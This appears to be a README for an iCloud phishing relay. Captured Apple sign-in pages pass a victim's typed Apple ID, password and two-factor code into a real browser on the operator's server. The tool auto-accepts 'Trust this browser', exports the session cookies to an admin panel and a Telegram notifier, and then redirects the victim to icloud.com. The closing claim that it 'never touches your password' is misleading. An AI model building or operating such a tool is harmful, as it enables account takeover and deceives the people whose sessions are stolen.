What does *not* count: the complaint adding elements of its own to the
form, and the browser changing its address. Both happen while the browser
is still asking the same question, and treating either as progress is what
carried the person off to the code page while the browser was still asking
for the right password.

A complaint that is *hidden* is not a complaint — the widget keeps the
element there and hides it when there is nothing wrong.

## The end of the road is iCloud

The code was good: the browser is in iCloud, the sign-in form is gone, and
there is nothing left in the captures for that person to do. So the app
takes them to icloud.com — and the captures are closed to them: any capture
they try to open is answered with a redirect to icloud.com instead of the
page.

The browser is told by the same reading everything else is told by: the
sign-in form is gone and the address is icloud.com. A browser that is still
on Apple's sign-in frame, or still showing the form, is not through.

**"Trust this browser?" is answered.** Accepting the verification code is
not quite the end: Apple then asks whether this browser may be trusted, and
it asks with one button and no form —

```html
<button class="button button-rounded-rectangle" type="submit">Trust</button>
```

— and the browser sits on that question: the page is a button, the sign-in
form is gone, and nobody is signed in until it is answered. So the app
watches for it and presses it, once, as soon as it is seen. It is found by
what it says, not by a class Apple can change, and it is only ever the
button that says *Trust*: the one beside it says *Don't Trust*, and a
button that says something else is not this step.

While the question is on the screen the app does not call the client
signed in — that is what "wait for this, and accept" means here. Nothing is
clicked by hand, and a question that will not go (a page that has stopped
answering presses) does not hold the person there for ever: after 30
seconds the app reads the rest of the page and carries on.

**The cookies are kept when the client signs in.** The moment the browser is
through, the session is allowed to have its cookies exported without the
operator allowing it by hand, and the cookies are read out of the browser
while it is still open. They are kept with the session, with the record of
it, and on disk in `cookies/` — one file per client, written `0600`,
`.gitignore`d, because a cookie is a credential.

That is what makes a client's cookies readable when they are offline: their
profile is a memory that can only be read by opening the browser again, and
by then the folder may be held open or the machine may have been restarted.
The panel's **Get** button still works through all three: the live browser,
the record of a client who has gone, and the file written while they were
signed in.

## The client's own state

How far a person has got is kept in their own browser, in one place:
`localStorage["icloud_state"]`.

```json
{"page": "/src/2.html", "stage": "Signed in", "finished": true, "at": 1795386452}
```

The engine writes the step it is on every time a capture is opened, and the
server is told about it when the engine says hello. Then:

- **no state at all** — the process starts as usual;
- **a state that does not say they finished** — the process starts as usual;
- **a state that says they finished** — the server sends them to iCloud
  instead of through the whole thing again.

It is the client's own storage, so another person on another browser has
their own, and nobody else's. Somebody who has got in stays got in: opening
a capture again does not take the flag away.

## A letter that is taken away is taken away with a key

The person pressed backspace, so the letter that is gone is taken away with
the same key, one at a time — the cursor goes where the letter was first.
Emptying the field and typing it all again would be a different thing
altogether as far as the widget is concerned, and the widget is what is
being watched: it is trying to work out what the address is.

So `me@mail.com` with the `m` taken away is `e@mail.com` in the browser,
not `me@mail.com` again.

## "Keep me signed in" is always on

The box on the password step is ticked in the browser, every time, whether
the capture's own copy of it says anything or not. The session is the whole
point of the browser being here: a browser that forgets the sign-in is a
browser that has to be signed into again.

A box is ticked, not typed — typing into a box means clicking it, and a
click on a ticked box unticks it. So the box is clicked when the browser
shows it, and set as it is when the page hides it behind a picture of one.
The capture shows what the browser thinks, so the capture's own box is
ticked too.

## Console output

```
[icloud] launching system chrome
[icloud] clicking Sign In
[icloud] done - sign in yourself in the browser window
[icloud] browser: account_name_text_field written
[icloud] browser: sign-in pressed
[icloud] page: /src/2.html
```

System Chrome is the one that is tried first: it is the browser the machine
already has, it is the one the person is used to, and it is there without a
download. The bundled Chromium is the fallback for a machine with no Chrome.

The `browser:` lines are the bridge: a value written into the browser, and a
button pressed in it. When a control is not there yet, the line says so and
says what the browser *does* have:

```
[icloud] browser: account_name_text_field not found yet - the browser has no controls yet - the sign-in widget may still be loading
```

And when the button is there but will not go down — Apple's Continue stays
disabled until the form is filled in — the line says that instead:

```
[icloud] browser: sign-in is disabled - the browser's form is not filled in yet
```

That is the difference between a control that is there under another name
and a browser that has not loaded the widget yet, which are two very
different problems and used to look the same.

The `page:` line is the hub following a viewer to another captured page. If a
captured page stops responding to typing, the question is whether `/sync.js`
was served with it — open the page's source and look for the script tag.

## A screen for every session

The browser the app signs in with is a real browser, and a real browser opens
a window, and a window needs an X server. A server has none. So on a machine
with no `DISPLAY` the app starts **one Xvfb per session** — an X server that
draws on nothing — and starts that session's browser on it:

```
[icloud] no screen on this machine - every session gets one of its own from Xvfb
[icloud] each browser opens on a display from 99 upwards, and the display number is in its session
[icloud] giving someonevisitor1 a screen of its own
[icloud] ...it is :99, and no other session is on it
[icloud] launching system chrome
[icloud] browser open (system chrome)
```

**One each, never one for the app.** A screen is shared the way a desktop is
shared: two Chromes on one display are two windows on one desktop, and then
the second one can decide the first is already running and hand its URL over
and exit, a dialog appears in front of the wrong person's browser, "bring this
tab to the front" is whatever the window manager decides, and one crash takes
everybody's screen with it. A browser alone on its own display behaves the way
a browser on its own machine behaves, which is what the rest of the app
assumes. The display number is per session, and the panel says which:

```
Online    iCloud                     its own screen :102
```

**It goes when the browser goes.** `Session.close()` — the one place a browser
is shut down, whether the visitor finished, failed, or went away — stops the
Xvfb that browser was on and frees the number for the next person. Stopping
the server shuts down every session, so Ctrl-C is not a machine slowly filling
up with orphaned X servers.

**What is where.**

| Setting | What it does |
| --- | --- |
| `DISPLAY` / `WAYLAND_DISPLAY` | used as it is; nothing is started |
| `ICLOUD_XVFB=1` | a screen of its own even when there is a display |
| `ICLOUD_XVFB=0` | never start Xvfb |
| `ICLOUD_SCREEN` | what Xvfb draws, default `1360x1024x24` |
| `ICLOUD_XVFB_FIRST` | the first display number tried, default `99` |

**Nobody has to look at it.** The person signs in through the capture, and
what they type there is written into the browser by the bridge — the window is
where the browser renders, not where the person is. So a virtual screen is not
a lesser screen here: it is the same browser on the same page. Watching one
anyway is one command, if you ever want to see what a session's browser is
actually showing:

```bash
sudo apt install x11vnc
x11vnc -display :102 -localhost -nopw     # then ssh -L 5900:localhost:5900
```

**And if there is no Xvfb either**, the browser is started without a window
(`headless=True`) rather than the app refusing to run: the capture is still
what gets typed into, so everything but the window still works. The console
says so, and says `sudo apt install xvfb`.

## When no browser will open on Linux

```
[icloud] launching system chrome
[icloud] system chrome unavailable: BrowserType.launch_persistent_context: Target page, context or browser has been closed
[icloud] launching bundled chromium
[icloud] bundled chromium unavailable: BrowserType.launch_persistent_context: Target page, context or browser has been closed
[icloud] launching system edge
[icloud] system edge unavailable: Chromium distribution 'msedge' is not found at /opt/microsoft/msedge/msedge
```

Read the first two lines carefully: they are **not** the same failure. A
browser that is not installed says so, in as many words — that is what the
Edge line is — so "unavailable: ... has been closed" means Chrome *is*
installed, started, and died before it drew anything. Which is one of three
things, and Playwright gives the same sentence for all of them.

**1. There is no screen.** A server, a container, a cloud runner, a bare
Debian box and `ssh` without `-X` all have no `$DISPLAY` — and a browser
cannot open a window on nothing. This is the one you almost certainly have.
Check:

```bash
echo "DISPLAY=[$DISPLAY] WAYLAND_DISPLAY=[$WAYLAND_DISPLAY]"
```

The answer is not to move the app to a desktop. Install Xvfb and the app gives
**every session a screen of its own** (see [A screen for every
session](#a-screen-for-every-session)):

```bash
sudo apt install xvfb
./run.sh
```

A real display is used as it is, so a desktop needs none of this.

**2. It is a root shell.** Chromium refuses to run as root — it exits
immediately, which is the same "has been closed". The app now adds
`--no-sandbox` when it finds it is root, so Chrome starts; the better answer
is a normal user.

**3. The libraries are missing.** The browser is there, but `libnss3`,
`libgbm1`, `libasound2` and the rest of the X libraries are not:

```bash
sudo .venv/bin/python -m playwright install-deps chromium
```

**Getting Chrome.** Chrome is tried first because it is the browser the
machine already has and the one Apple's sign-in expects company from. To
install it, Playwright will do it — download, `apt`, dependencies and all:

```bash
sudo .venv/bin/python -m playwright install chrome --with-deps
```

or from Google's own package:

```bash
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo apt install ./google-chrome-stable_current_amd64.deb
```

Either way the app finds it on the next run: `channel="chrome"` is the first
candidate in `BROWSERS`, and the bundled Chromium stays as the fallback for a
machine with no Chrome. `./run.sh` says which of the two it can see before the
server starts.

**The app says all this itself now.** When every candidate fails it logs what
*this* machine needs — the missing browser, the missing libraries, the root
shell, the absent screen — instead of three copies of the same verdict, and a
machine with no `DISPLAY` is told at startup rather than at the first click.

## Tests

```bash
npm install   # once, pulls jsdom
npm test
```

Nine suites:

- `test-launcher.js` runs `client.html` in jsdom with a stubbed `/status`. It
  pins the splash: the screen is only the mark — no text, no buttons, nothing
  that pops up — it navigates only once the run is over, it navigates on a
  failed launch too, and it stops polling after it goes.
- `test-sync.js` runs `sync.js` in jsdom with a stubbed WebSocket. It pins the
  protocol: typing is not sent mid-word, an unchanged field is not sent again,
  a checkbox carries its state, a click carries its position, a remote value
  lands without being echoed, a remote click is drawn and not replayed, a
  captured link reports its destination, a link out of the captures is not
  followed, a submit is cancelled, and a dropped socket reconnects and asks
  for the state again. It also pins the bridge: typing is sent to the browser
  as well, a button pressed is pressed in the browser, and what the browser is
  showing is put back into the capture.
- `test-admin.js` runs `admin.html` in jsdom with a stubbed WebSocket and a
  stubbed API. It pins the panel as a subscriber: a browser that is already
  signed in opens the panel and subscribes without asking for the secret
  again, a refused line says the secret is needed and is retried, a client
  that was pushed as connected is drawn as connected rather than idle, the
  counters agree with the rows, and a picture older than the one on screen
  is not drawn over it.
- `test_sessions.py` runs the session manager by itself, with stand-in
  sessions: a client comes through the door once and is `new`, then `here`,
  and is `back` after being put away; a change that nobody announced is
  still noticed by `sync`; the moment a visitor last typed is not a redraw;
  a subscriber that breaks does not break the others; and — with the
  server's own session — a client that connects reaches a listening panel
  without the server telling the panel anything.
- `test_sync.py` runs the rest of `server.py` without uvicorn: the engine is
  injected once and only into HTML, the capture's policy is extended rather
  than replaced, the frames a capture carries are made reachable, the nested
  document inside a frame is left alone, assets keep their type, nothing
  outside `src/` is readable, a missing capture says so, and the hub really
  is the shared state — a value reaches the other viewer and the next one to
  join, a click is relayed but a click with no position is dropped, a link
  moves every viewer and clears form state, an off-site page is refused, a
  viewer that leaves is forgotten, and `/` is the launcher until the browser
  is up and the capture afterwards. It also pins the end: the *Trust*
  question is answered before the client is called signed in, signing in
  allows the session's cookies and reads them while the browser is open,
  they are written `0600` in `cookies/`, and they are still readable after
  the record of the client is gone.
- `test_live.py` runs the bridge without a browser: the browser is a stub, so
  the scripts the bridge runs in the browser are the shipped ones while the
  browser answering them is not real. It pins that a value reaches the field
  with the same id — in whichever frame holds it, and in whichever tab — that
  a button is pressed there too, that an id that is not an id is refused,
  that a value with nowhere to go yet is kept and written when its field
  turns up, that what the browser is showing reaches the viewers, and that
  "Trust this browser?" is read as a question and answered by pressing
  *Trust* — and only *Trust*.
- `test_inline_font.py` runs `inline_font.py` over the captures on disk: every
  page carries the font, and its frame carries it too, the bytes carried are
  the font file itself, there is no address in the page to fetch a font from,
  the page asks for Montserrat on every element and does not swap a fallback
  in first, and a second run changes nothing.
- `test_admin.py` runs the control room's own rules: the settings file is a
  secret and is read again when it changes, the token is masked, a cookie is
  exported in Cookie Editor's format, the clients and the Telegram settings
  and the cookies are for the admin only, a session's cookies are exported
  only when it has been allowed, and a line whose secret is no longer the
  secret is closed with the code that says so.
- `test_browser.py` runs the whole way round in a real Chromium: a capture
  with the policy a SingleFile capture carries, and the form in a frame that
  is sandboxed without `allow-same-origin`. It pins that the engine runs at
  all, that the policy does not refuse it, that the form inside the frame is
  reachable, and that typing and pressing in the capture reach the browser —
  and come back. It also runs the three scripts the bridge sends into the
  browser, in a page, as they are run in the browser: a stub that answers for
  them proves nothing about whether they work. It is skipped when there is
  no browser to be had.

`npm test` runs all of them and prints one total; `node tests/run.js` finds
the project virtualenv by itself.

## Files

- `server.py` — FastAPI: `/` `/start` `/status` `/src/…` `/sync.js` `/ws` `/nav`
  and `/admin` (the control room, from `admin.py`)
- `sessions.py` — the session manager: the one door every client comes
  through, and the events the control room subscribes to
- `sync.js` — runs in the captured page; reports and applies form state, clicks
  and navigation, and talks to the browser through the server
- `live.py` — the bridge to the browser the server opened: finds a control by
  its id, writes a value into it, presses it (including the *Trust* button
  the browser asks about after the code), and reads back what the browser is
  showing
- `client.html` — the launcher; opens the browser, then becomes `/src/1.html`
- `src/` — the captures (yours; `1.html` is the one the app opens) and
  `src/flow.json`, which says which capture leads to which
- `admin.py` and `admin.html` — the control room: the panel, its API, and
  the settings it keeps (`admin.json`, a secret file, in `.gitignore`), and
  the cookies of the clients who signed in (`cookies/`, also ignored)
- `telegram.py` — the Telegram notifier
- `fonts/` — Space Grotesk for the panel and Montserrat for the captures,
  both served by the app (SIL Open Font License 1.1)
- `inline_font.py` — puts the font into the captures themselves, so nothing is
  fetched and nothing flashes; run it after a capture is refreshed (`python3
  inline_font.py`, or `--check` to say whether one still needs it)
- `run.bat` — Windows launcher
- `run.sh` — Linux (and macOS) launcher: sets up `.venv`, installs the
  requirements and Chromium, sets `ICLOUD_ADMIN_TOKEN`, says what the machine
  is missing (a browser, a screen), starts the server
- `xvfb.py` — a screen of one's own: an Xvfb per session, for a machine with
  no display, so every browser has a window to open and no two share one
- `tests/` — the suites above

## Note

The app clicks Sign In and then stops. You type your Apple ID and two-factor
code yourself — in the browser window that opened, or through the capture,
which writes into that window — it never touches your password. The page in the app is the capture from `src/`, not that window, and
it does not wait for you to finish signing in: it appears as soon as Sign In
has been clicked.

What you type into the capture *is* typed into the browser, so the capture is
not a copy you work in: it is the controls for the session the browser holds.
The password is not read back — it is written once, by you, and it is never
broadcast to another viewer or kept in the server's memory.
